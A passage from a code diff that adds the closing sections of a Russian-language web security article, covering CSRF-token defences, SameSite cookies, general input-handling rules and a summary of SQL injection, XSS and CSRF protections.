+      <p><strong>CSRF-токены.</strong> Главная защита. Сервер выдаёт странице уникальный токен, который нужно приложить к каждому изменяющему запросу. Злоумышленник не знает токен — его запрос не пройдёт.</p>
+
+      <pre><code class="language-html">&lt;form action="/transfer" method="POST"&gt;
+  &lt;input type="hidden" name="csrf_token" value="a8f5f167f44f4964e6c998dee827110c"&gt;
+  &lt;input type="text" name="amount"&gt;
+  &lt;button&gt;Перевести&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+
+      <p>Сервер проверяет: токен из формы совпадает с токеном в сессии? Если нет — отклоняет запрос.</p>
+
+      <p>Дополнительные меры:</p>
+
+      <ul>
+        <li><strong>SameSite cookie.</strong> Атрибут <code>SameSite=Strict</code> или <code>SameSite=Lax</code> говорит браузеру: не отправляй куки при переходах с других сайтов.</li>
+        <li><strong>Проверка заголовка Referer.</strong> Запрос должен прийти с твоего сайта, а не с чужого.</li>
+        <li><strong>Только POST для изменений.</strong> GET-запросы не должны менять данные.</li>
+      </ul>
+
+      <h2>Общий принцип: не доверяй пользователю</h2>
+
+      <p>Все три уязвимости — про одно и то же. <strong>Любые данные от пользователя — потенциально опасны</strong>. Логин, комментарий, параметр URL, значение формы — всё это может быть оружием.</p>
+
+      <p>Правила гигиены:</p>
+
+      <ol>
+        <li><strong>Валидация.</strong> Проверяй, что данные соответствуют ожиданиям. Email — email, число — число, длина в пределах разумного.</li>
+        <li><strong>Экранирование на выходе.</strong> Прежде чем вставить данные в HTML — экранируй.</li>
+        <li><strong>Параметризация на входе в SQL.</strong> Никогда не склеивай запросы вручную.</li>
+        <li><strong>Токены для действий.</strong> Любое изменение состояния — только с CSRF-токеном.</li>
+        <li><strong>Принцип наименьших привилегий.</strong> Приложение должно иметь только те права, что ему нужны.</li>
+      </ol>
+
+      <h2>Что читать дальше</h2>
+
+      <ul>
+        <li><strong>OWASP Top 10.</strong> Официальный список главных уязвимостей — обновляется каждые 3 года.</li>
+        <li><strong>Content Security Policy.</strong> Заголовок, который блокирует XSS на уровне браузера.</li>
+        <li><strong>OAuth 2.0.</strong> Протокол для безопасной авторизации через чужие сервисы.</li>
+      </ul>
+
+      <h2>Итог</h2>
+
+      <p>SQL-инъекция, XSS и CSRF — три классические атаки, которые до сих пор работают. От первой спасают параметризованные запросы, от второй — экранирование и CSP, от третьей — CSRF-токены и SameSite cookie. Все три объединяет одно правило: никогда не доверяй пользовательскому вводу. Если хочешь глубже про безопасность — посмотри <a href="article.html?a=kak-rabotaet-https">как работает HTTPS</a> и <a href="article.html?a=api-klyuch-kak-ne-slit">как не слить API-ключ</a>.</p>
+    `
+     }
 ];
